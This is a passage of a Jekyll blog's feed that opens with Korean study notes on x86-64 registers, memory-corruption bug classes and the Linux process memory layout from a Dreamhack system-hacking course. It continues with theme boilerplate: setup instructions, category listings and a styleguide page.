&lt;p&gt;예시: ax(eax의 하위 16비트) &amp;lt; eax(rax의 하위 32비트) &amp;lt; rax&lt;/p&gt;

&lt;p&gt;그 와중에 16비트 아키텍처의 레지스터는 eax의 상위 8비트, 하위 8비트를 차지하는 것도 있음. (AX, BX, CX, DX 계열 중 끝이 H면 High로 상위 8비트, L면 Low로 하위 8비트)&lt;/p&gt;

&lt;h1 id=&quot;background-linux-memory-layout&quot;&gt;Background: Linux Memory Layout&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Memory Corruption: 공격자가 악의적으로 조작한 메모리 값에 의해 CPU가 잘못된 동작을 하게 되는 공격. 시스템 해킹의 공격 기법의 기본이 되는 기법.&lt;/li&gt;
  &lt;li&gt;Memory Corruption을 이용한 취약점의 종류:
    &lt;ul&gt;
      &lt;li&gt;Stack Buffer Overflow&lt;/li&gt;
      &lt;li&gt;Off by One&lt;/li&gt;
      &lt;li&gt;Format String Bug&lt;/li&gt;
      &lt;li&gt;Double Free Bug&lt;/li&gt;
      &lt;li&gt;Use After Free&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;리눅스-프로세스의-메모리-구조&quot;&gt;리눅스 프로세스의 메모리 구조&lt;/h2&gt;

&lt;h3 id=&quot;5개-segment&quot;&gt;“5개 Segment”&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;적재되는 데이터 용도별로 메모리의 구획을 나눈 것.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;리눅스에서 프로세스의 메모리를 구분하는 방식.&lt;/li&gt;
    &lt;li&gt;1) 코드 세그먼트, 2) 데이터 세그먼트, 3) BSS 세그먼트, 4) 힙 세그먼트, 5) 스택 세그먼트&lt;/li&gt;
    &lt;li&gt;구획별로 권한이 다르고, CPU는 해당 구역에 부여된 권한에 맞는 행위만 할 수 있음.
      &lt;ul&gt;
        &lt;li&gt;READ&lt;/li&gt;
        &lt;li&gt;WRITE&lt;/li&gt;
        &lt;li&gt;EXECUTE&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;더 자세히 알고 싶다면, 세그먼테이션 기법 &amp;amp;&amp;amp; x86-64 하드웨어 설계 참고.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/systemHackingStep2_2.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;우와~ 리눅스에서는 실행 중인 프로세스의 메모리가 5개의 영역으로 구분되고, 각 영역별로 CPU가 부여받은 권한이 다르구나!&lt;/p&gt;

&lt;h3 id=&quot;code-segment&quot;&gt;“Code Segment”&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;실행 가능한 기계 코드가 위치하는 영역&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;READ &amp;amp; EXECUTE: CPU가 코드를 “읽어서” “실행”해야 하므로.&lt;/li&gt;
    &lt;li&gt;WRITE 권한이 절대 있으면 안되는 영역: 악의적인 코드를 “쓰면” 안 되니까.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;data-segment&quot;&gt;“Data Segment”&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;컴파일 시점에 값이 정해진 전역 변수 &amp;amp; 전역 상수가 위치하는 영역.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;Initialized Global&lt;/li&gt;
    &lt;li&gt;READ + (상황에 따라 WRITE)&lt;/li&gt;
    &lt;li&gt;데이터 세그먼트에는 두 종류가 있음.
      &lt;ul&gt;
        &lt;li&gt;Data Segment
          &lt;ul&gt;
            &lt;li&gt;WRITABLE: 프로그램이 실행되면서 값이 변할 수 있는 데이터들. 예) 글로벌 “변수” 등…&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
        &lt;li&gt;ROData Segment: Read-Only
          &lt;ul&gt;
            &lt;li&gt;Non-WRITABLE: 프로그램이 실행되면서 값이 변하면 안 되는 데이터들. 예) 글로벌 “상수”&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;bss-segment&quot;&gt;“BSS Segment”&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;컴파일 시점에 값이 정해지지 않은 전역 변수가 위치하는 영역.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;Block Started by Symbol Segment&lt;/li&gt;
    &lt;li&gt;Not Initialized Global; 선언만 하고 초기화는 안한 전역 변수들&lt;/li&gt;
    &lt;li&gt;프로그램 시작 시 모두 0으로 값이 초기화됨.&lt;/li&gt;
    &lt;li&gt;READ + WRITE&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;stack-segment&quot;&gt;“Stack Segment”&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;프로세스의 스택이 위치하는 영역. 함수의 인자, 지역 변수 등의 임시 변수들이 ‘프로세스 실행 중’에 저장되는 공간.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;READ + WRITE&lt;/li&gt;
    &lt;li&gt;“스택 프레임(Stack Frame)”이라는 단위로 사용됨.
      &lt;ul&gt;
        &lt;li&gt;함수가 호출될 때 생성되고, 반환될 때 해제됨(우리가 익히 아는 그것)&lt;/li&gt;
        &lt;li&gt;프로그램의 코드 플로우를 정확히 예측하는 건 불가능하므로, 스택도 가변적으로 할당됨.
          &lt;ul&gt;
            &lt;li&gt;작은 크기의 스택 세그먼트를 먼저 할당해 주고, 부족해지면 확장.&lt;/li&gt;
            &lt;li&gt;“아래로 자란다”: 높은 주소→낮은 주소로 확장.&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;heap-segment&quot;&gt;“Heap Segment”&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;힙 데이터가 위치하는 세그먼트. 메모리 할당 시 할당된 메모리가 저장된다.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;READ + WRITE&lt;/li&gt;
    &lt;li&gt;스택과 동일하게 실행중에 동적으로 할당된다.&lt;/li&gt;
    &lt;li&gt;리눅스에서는 스택 세그먼트와 반대 방향으로 자란다: 낮은 주소 → 높은 주소로 확장.&lt;/li&gt;
    &lt;li&gt;할당된 메모리가 저장된다: C언의 경우 malloc(), calloc()등으로 할당받은 메모리가 저장된다.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;Q. 힙과 스택 세그먼트가 자라는 방향이 반대인 이유?&lt;/p&gt;

&lt;p&gt;A. 동일하면 충돌하니까. 따라서 리눅스는 스택 베이스를 메모리 끝에 위치시키고 힙 베이스는 낮은 주소에 위치시켜서 충돌할 일이 거의 없게 만들어 놨음.&lt;/p&gt;
</description>
        <pubDate>Thu, 23 Jun 2022 12:24:23 +0900</pubDate>
        <link>http://localhost:4000/blog/dreamhack_system_hacking/step2-1</link>
        <guid isPermaLink="true">http://localhost:4000/blog/dreamhack_system_hacking/step2-1</guid>
      </item>
    

    
      
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
      
        
          <item>
            <title>About</title>
            <description>&lt;p&gt;This is the base Jekyll theme. You can find out more info about customizing your Jekyll theme, as well as basic Jekyll usage documentation at &lt;a href=&quot;https://jekyllrb.com/&quot;&gt;jekyllrb.com&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can find the source code for Minima at GitHub:
&lt;a href=&quot;https://github.com/jekyll&quot;&gt;jekyll&lt;/a&gt; /
&lt;a href=&quot;https://github.com/jekyll/minima&quot;&gt;minima&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can find the source code for Jekyll at GitHub:
&lt;a href=&quot;https://github.com/jekyll&quot;&gt;jekyll&lt;/a&gt; /
&lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;jekyll&lt;/a&gt;&lt;/p&gt;

</description>
            <link>http://localhost:4000/about/</link>
          </item>
        
      
    
      
    
      
        
          <item>
            <title></title>
            <description>&lt;h3&gt;   &lt;/h3&gt;

&lt;div id=&quot;categories&quot;&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#dreamhack_system_hacking&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/dreamhack_system_hacking&quot;&gt;dreamhack_system_hacking&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;dreamhack_system_hacking&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step6-1&quot;&gt;System Hacking Step 6-1&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step5-basic_exploitation_000&quot;&gt;Wargame: Basic_Exploitation_000&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step5-3&quot;&gt;System Hackig Step 5-3&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step5-2&quot;&gt;System Hackig Step 5-2&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step5-1&quot;&gt;System Hackig Step 5&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step4-2&quot;&gt;System Hackig Step 4-2: Shell_basic&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step4-1&quot;&gt;System Hackig Step 4&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step3-2&quot;&gt;System Hackig Step 3-2&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step3-1&quot;&gt;System Hackig Step 3-1&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step2-2&quot;&gt;System Hackig Step 2-2&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step2-1&quot;&gt;System Hackig Step 2&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#system_hacking&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/system_hacking&quot;&gt;system_hacking&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;system_hacking&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/plt-got-overwrite&quot;&gt;PLT &amp;amp; GOT Overwrite in x86-64&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/protostar-format1/&quot;&gt;Protostar-format1.c x86-64&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/memory-exploit-mitigation-bypass-01/&quot;&gt;Memory Exploit Mitigations and How to Bypass them 01&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/protostar-stack5-x86-x64/&quot;&gt;Protostar-stack5.c x86 &amp;amp; x86-64&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#protostar&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/protostar&quot;&gt;protostar&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;protostar&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/plt-got-overwrite&quot;&gt;PLT &amp;amp; GOT Overwrite in x86-64&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/protostar-format1/&quot;&gt;Protostar-format1.c x86-64&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/protostar-stack5-x86-x64/&quot;&gt;Protostar-stack5.c x86 &amp;amp; x86-64&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

&lt;/div&gt;

</description>
            <link>http://localhost:4000/blog/categories/</link>
          </item>
        
      
    
      
    
      
        
          <item>
            <title>system_hacking_basic</title>
            <description>&lt;h5&gt; Posts by Category : system_hacking_basic &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;08 Jan 2023&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step6-1&quot;&gt;System Hacking Step 6-1&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;28 Dec 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step5-basic_exploitation_000&quot;&gt;Wargame: Basic_Exploitation_000&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;22 Aug 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step5-3&quot;&gt;System Hackig Step 5-3&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;17 Aug 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step5-2&quot;&gt;System Hackig Step 5-2&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;12 Aug 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step5-1&quot;&gt;System Hackig Step 5&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;29 Jul 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step4-2&quot;&gt;System Hackig Step 4-2: Shell_basic&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;20 Jul 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step4-1&quot;&gt;System Hackig Step 4&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;15 Jul 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step3-2&quot;&gt;System Hackig Step 3-2&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;10 Jul 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step3-1&quot;&gt;System Hackig Step 3-1&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;28 Jun 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step2-2&quot;&gt;System Hackig Step 2-2&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;23 Jun 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step2-1&quot;&gt;System Hackig Step 2&lt;/a&gt;&lt;/li&gt;

&lt;/div&gt;
</description>
            <link>http://localhost:4000/blog/categories/dreamhack_system_hacking/</link>
          </item>
        
      
    
      
    
      
        
          <item>
            <title>Guides</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.guides %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>http://localhost:4000/blog/categories/guides/</link>
          </item>
        
      
    
      
    
      
    
      
    
      
    
      
        
          <item>
            <title>Get Started</title>
            <description>## Getting Started - How to use “devlopr-jekyll” theme

## What&apos;s Jekyll ?

If you aren’t familiar with Jekyll yet, you should know that it is a static site generator. It will transform your plain text into static websites and blogs. No more databases, slow loading websites, risk of being hacked…just your content. And not only that, with Jekyll you get free hosting with GitHub Pages! If you are a beginner we recommend you start with [Jekyll’s Docs](https://jekyllrb.com/docs/installation/). Now, if you know how to use Jekyll, let’s move on to using this theme in Jekyll:

## Watch Tutorial

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/cXBEfpn0qrg?rel=0&amp;amp;controls=0&amp;amp;showinfo=0&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;


### Steps to create your blog using devlopr-jekyll and Host using Github Pages :

&gt;  **Step 1.**  Fork the repo - [click here](https://github.com/sujaykundu777/devlopr-jekyll/fork)

![Devlopr Jekyll Repo](/assets/img/posts/fork1.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 2.** Use **your-github-username.github.io** as the new repo  ( Replace your-github-username with yours). Remember if you use the name other than your-github-username.github.io , your blog will be built using gh-pages branch.

![Devlopr Jekyll Repo](/assets/img/posts/fork2.PNG){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork3.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 3.** Clone the new repo locally to make changes :

![Devlopr Jekyll Repo](/assets/img/posts/fork31.PNG){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork32.PNG){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork33.PNG){:class=&quot;img-fluid&quot;}

```bash
 $ git clone https://github.com/yourusername/yourusername.github.io
 $ cd yourusername.github.io
 $ code .
```

&gt; **Step 4.** Open the files using VSCode and edit _config.yml and edit with your details:

- _config.yml file - replace with your own details
- _posts - Add your blog posts here
- _includes - You can replace the contents of the files with your data. (contains widgets)
- _assets/img - Add all your images here

![Devlopr Jekyll Repo](/assets/img/posts/fork34.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 5** - Install the development requirements:

### Set up local development environment

1. [Git](https://git-scm.com/)
2. [Ruby](https://www.ruby-lang.org/) and [Bundler](https://bundler.io/)
3. [VSCode](https://code.visualstudio.com/download)

We need ruby and bundler to build our site locally. After installation check if its working:

For ruby :

```bash
$ ruby -v
ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-linux-gnu]
```
For bundler :

```bash
$ gem install bundler
$ bundler -v
Bundler version 2.2.29
```
Add jekyll :

```bash
$ bundle update
$ bundle add jekyll
```
 This command will add the Jekyll gem to our Gemfile and install it to the ./vendor/bundle/ folder.

You can check the jekyll version

```
$ bundle exec jekyll -v
jekyll 4.2.0
```

&gt; **Step 6.** Install the gem dependencies by running the following command

```bash
$ bundle update
$ bundle install
```

&gt; **Step 7.** Serve the site locally by running the following command below:

```bash
$ bundle exec jekyll serve --watch
```
or you can also serve using :

```bash
$ jekyll serve
```

Visit [http://localhost:4000](http://localhost:4000) for development server

![Devlopr Jekyll Repo](/assets/img/posts/fork41.PNG){:class=&quot;img-fluid&quot;}


### Adding Content

Start populating your blog by adding your .md files in _posts. devlopr-jekyll already has a few examples.

#### YAML Post Example:

```yml
---
layout: post
title: Sample Post
author: Sujay Kundu
date: &apos;2019-05-21 14:35:23 +0530&apos;
category:
        - jekyll
summary: This is the summary for the sample post
thumbnail: sample.png
---

Hi ! This is sample post.

```

#### YAML Page Example:

```yml
---
layout: page
title: Sample Page
permalink: /sample-page/
---

Hi ! This is sample page.
```

#### Editing stylesheet

You’ll only work with a single file to edit/add theme style: assets/css/main.scss.

### Deploy your Changes

Once happy with your blog changes. Push your changes to master branch.

&gt; **Step 8.** Push Your Local Changes

```bash
 $ git add .
 $ git commit -m &quot;my new blog using devlopr-jekyll&quot;
 $ git push origin master
```

Visit your Github Repo settings ! Enable master branch as Github Pages Branch :

![Devlopr Jekyll Repo](/assets/img/posts/fork6.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 9.** Deploy your Blog :

![Devlopr Jekyll Repo](/assets/img/posts/fork7.PNG){:class=&quot;img-fluid&quot;}

&gt; Congrats ! On your new shining Blog !

You can visit the blog using [http://your-github-username.github.io](http://your-github-username.github.io).

</description>
            <link>http://localhost:4000/get-started/</link>
          </item>
        
      
    
      
    
      
    
      
        
          <item>
            <title>protostar</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.protostar %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>http://localhost:4000/blog/categories/protostar/</link>
          </item>
        
      
    
      
        
          <item>
            <title>Guides</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.sample_category %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>http://localhost:4000/blog/categories/sample_category/</link>
          </item>
        
      
    
      
    
      
        
          <item>
            <title>Our Sponsors</title>
            <description>Thanks to all the amazing contributors and our Backers for the support.

- [Dirish Mohan](https://dirishmohan.com)</description>
            <link>http://localhost:4000/sponsors/</link>
          </item>
        
      
    
      
        
          <item>
            <title>Styleguide</title>
            <description>### devlopr - Styleguide

&lt;hr /&gt;

 &lt;img src=&quot;/assets/img/styleguide.png&quot; class=&quot;img-fluid&quot;&gt;

&lt;p&gt; Lets try the different text styles  &lt;b&gt; Bold &lt;/b&gt; , &lt;strong&gt; Strong &lt;/strong&gt;, &lt;em&gt; Emphasis &lt;/em&gt;, &lt;i&gt; Italic &lt;/i&gt; &lt;/p&gt;


&lt;p&gt; Now, lets try different heading styles : &lt;/p&gt;

&lt;h1&gt; Hello in h1 ! &lt;/h1&gt;
&lt;h2&gt; Hello in h2 ! &lt;/h2&gt;
&lt;h3&gt; Hello in h3 ! &lt;/h3&gt;
&lt;h4&gt; Hello in h4 ! &lt;/h4&gt;
&lt;h5&gt; Hello in h5 ! &lt;/h5&gt;
&lt;h6&gt; Hello in h6 ! &lt;/h6&gt;

&lt;hr /&gt;
&lt;p&gt; Unordered List &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt; List Item 1 &lt;/li&gt;
&lt;li&gt; List Item 2 &lt;/li&gt;
&lt;li&gt; List Item 3 &lt;/li&gt;
&lt;li&gt; List Item 4 &lt;/li&gt;
&lt;li&gt; List Item 5 &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt; Ordered List &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt; List Item 1 &lt;/li&gt;
&lt;li&gt; List Item 2 &lt;/li&gt;
&lt;li&gt; List Item 3 &lt;/li&gt;
&lt;li&gt; List Item 4 &lt;/li&gt;
&lt;li&gt; List Item 5 &lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
&lt;p&gt;This is a Block Quote,  It can Expand Multiple Lines &lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;You can use the mark tag to &lt;mark&gt;highlight&lt;/mark&gt; text. &lt;/p&gt;

&lt;p&gt;&lt;del&gt; This line of text is meant to be deleted text &lt;/del&gt; &lt;/p&gt;

&lt;p&gt;&lt;u&gt;This line of text will render as underlined&lt;/u&gt;&lt;/p&gt;
&lt;p&gt;&lt;small&gt;This line of text is meant to be treated as fine print.&lt;/small&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;This line rendered as bold text.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This line rendered as italicized text.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;abbr title=&quot;attribute&quot;&gt;attr&lt;/abbr&gt;&lt;/p&gt;
&lt;p&gt;&lt;abbr title=&quot;HyperText Markup Language&quot; class=&quot;initialism&quot;&gt;HTML&lt;/abbr&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;div class=&quot;responsive-table&quot;&gt;
&lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;col&quot;&gt;#&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;row&quot;&gt;1&lt;/th&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;row&quot;&gt;2&lt;/th&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;row&quot;&gt;3&lt;/th&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
    &lt;/div&gt;

&lt;hr /&gt;

&lt;h3&gt; Instagram Embed &lt;/h3&gt;

